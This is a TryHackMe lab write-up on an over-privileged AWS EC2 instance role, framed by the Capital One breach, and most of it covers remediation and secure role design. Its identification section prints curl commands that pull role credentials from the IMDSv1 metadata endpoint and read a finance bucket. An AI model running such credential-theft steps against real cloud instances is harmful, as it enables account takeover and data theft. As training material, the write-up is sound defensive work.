<p align="center">
  <img src="banner-overpowered-role.svg" width="820" alt="The Overpowered Role">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/TRYHACKME-1a0633?style=for-the-badge&labelColor=FF2A6D">
  <img src="https://img.shields.io/badge/EASY-1a0633?style=for-the-badge&labelColor=00F0FF">
  <img src="https://img.shields.io/badge/IAM_ROLES-1a0633?style=for-the-badge&labelColor=A479C4">
  <img src="https://img.shields.io/badge/IMDS-1a0633?style=for-the-badge&labelColor=A479C4">
</p>

---

## Overview

> [!NOTE]
> **TL;DR** — A web app on EC2 needs read access to one S3 bucket, but its instance role was given `s3:*` on `*`. You trace the instance → instance profile → role, prove the over-privilege by reading a finance bucket, steal role creds through **IMDSv1**, then remediate (scope the policy + enforce IMDSv2) and rebuild a secure service role from scratch. Framed by the Capital One breach — the textbook version of this exact bug.

## Real-world incident — Capital One (2019)

The kill chain the lab reproduces almost step for step:

1. **Initial access** — a crafted request exploited an **SSRF** in the WAF running on EC2.
2. **Credential theft** — the SSRF hit the **IMDS** endpoint; because the instance ran **IMDSv1**, no auth was needed — one request returned the role name, a second returned role credentials.
3. **Privilege inventory** — with the temp creds, the attacker listed all buckets.
4. **Exfiltration** — `s3 sync` pulled data on 100M+ people (names, DOBs, SSNs, credit scores, bank accounts).
5. **Discovery** — not caught by Capital One's own monitoring; an external researcher found the data posted publicly.

> [!IMPORTANT]
> Three failures stacked: an **over-privileged instance role**, **IMDSv1 enabled** (unauthenticated credential retrieval), and **no per-bucket VPC-endpoint control** (stolen creds worked from outside the VPC). Fix any one and the breach doesn't fully land.

## Identification — trace the role, prove the blast radius

**Instance → instance profile → role → policy:**

```bash
INSTANCE_ID=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=webapp-server" \
  "Name=instance-state-name,Values=running" --query "Reservations[0].Instances[0].InstanceId" --output text)
PROFILE_ARN=$(aws ec2 describe-instances --instance-ids $INSTANCE_ID \
  --query "Reservations[0].Instances[0].IamInstanceProfile.Arn" --output text)
ROLE_NAME=$(aws iam get-instance-profile --instance-profile-name <profile> \
  --query "InstanceProfile.Roles[0].RoleName" --output text)

aws iam list-attached-role-policies --role-name $ROLE_NAME
aws iam list-role-policies         --role-name $ROLE_NAME   # inline too
aws iam get-policy-version ...      # → "Action": "s3:*", "Resource": "*"  ← RED FLAG
```

**Prove it from inside the box (via SSM):**

```bash
aws ssm start-session --target $INSTANCE_ID
# inside:
aws s3 ls                                      # sees ALL buckets, not just webapp
aws s3 cp s3://thm-finance-reports-<id>/flag/overpowered-role.txt -   # flag

# steal role creds through IMDSv1 (no token needed):
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
#   → AccessKeyId, SecretAccessKey, Token
```

Confirm IMDSv1 is allowed from the control plane:

```bash
aws ec2 describe-instances --instance-ids $INSTANCE_ID \
  --query "Reservations[0].Instances[0].MetadataOptions"
#   "HttpTokens": "optional"   ← IMDSv1 permitted = insecure
```

## Remediation — scope the role, harden the metadata

> [!WARNING]
> **The gotcha that cost me time:** IAM/EC2 admin commands (`create-policy`, `modify-instance-metadata-options`) fail from *inside* the SSM session (`sh-5.2$`) — that shell runs as the instance's own limited role, which has no IAM permissions. **`exit` back to CloudShell** (`~ $`), where you're acting as your account admin. This is the whole point of the room made concrete: instance credentials ≠ your user credentials.

```bash
# run from CloudShell, NOT the SSM session
# 1. Scoped policy: GetObject/PutObject on config|assets|logs, ListBucket only on the webapp bucket
aws iam create-policy --policy-name WebAppScopedS3Policy --policy-document file://webapp-scoped-policy.json

# 2. Swap over-priv → scoped
aws iam detach-role-policy --role-name $ROLE_NAME --policy-arn $OLD_POLICY_ARN
aws iam attach-role-policy --role-name $ROLE_NAME --policy-arn $NEW_POLICY_ARN

# 3. Enforce IMDSv2 (no reboot needed)
aws ec2 modify-instance-metadata-options --instance-id $INSTANCE_ID \
  --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1
```

> [!TIP]
> **IMDSv2** requires a session token, killing unauthenticated SSRF credential theft — but creds already issued via IMDSv1 stay valid for **up to 6 hours**, so it's not instant. **`hop-limit 1`** stops containers/reverse proxies from forwarding the metadata token to external endpoints.

## Build it securely — a service role from day one

Four questions before creating any role: *which service assumes it? which API actions? which specific resources? what conditions?*

```bash
# trust policy: ONLY ec2.amazonaws.com (never Principal:*, never stray users/accounts)
aws iam create-role --role-name SecureWebAppRole \
  --assume-role-policy-document file://trust-policy.json \
  --permissions-boundary $BOUNDARY_ARN                       # boundary caps the ceiling

aws iam attach-role-policy --role-name SecureWebAppRole --policy-arn $SECURE_POLICY_ARN
aws iam attach-role-policy --role-name SecureWebAppRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore

# instance profile = the bridge that binds the role to EC2
aws iam create-instance-profile     --instance-profile-name SecureWebAppProfile
aws iam add-role-to-instance-profile --instance-profile-name SecureWebAppProfile --role-name SecureWebAppRole
```

Extra hardening (the layer Capital One lacked): an `aws:SourceVpc` condition + a VPC endpoint, so stolen creds are useless from outside the VPC.

## Task answers

| # | Task | Question | Answer |
|---|------|----------|--------|
| 1 | Introduction | Power overwhelming | *(no answer)* |
| 2 | Real-World Incident | Misconfiguration + room theme | `over-privileged instance role` |
| 3 | Identification | Other policy on the instance role | `AmazonSSMManagedInstanceCore` |
| 3 | Identification | Flag from the finance bucket | `THM{YIPEE_KI_***}` |
| 4 | Remediation | Flag | `THM{EN_TARO_****}` |
| 5 | Build It Securely | Flag | `THM{CARRIER_HAS_*******}` |
| 6 | Conclusion | The merging is complete | *(no answer)* |

## Lessons learned

- **Instance credentials ≠ your credentials.** The SSM shell runs as the instance role; admin work happens from CloudShell. Confusing the two is a common early stumble.
- **IMDSv1 is a credential-leak waiting for an SSRF.** Enforce IMDSv2 everywhere (`HttpTokens=required`), set `hop-limit 1`, or disable IMDS entirely if unused.
- **Scope roles to exact actions + ARNs.** `s3:*` on `*` means one app bug exfiltrates the whole account.
- **Trust policies are half the security.** Lock the principal to the exact service; a wildcard principal lets anyone assume the role.

---

<p align="center">
  <a href="README.md">
    <img src="more_writeups.svg" width="360" alt="Back to AWS Security Path">
  </a>
</p>
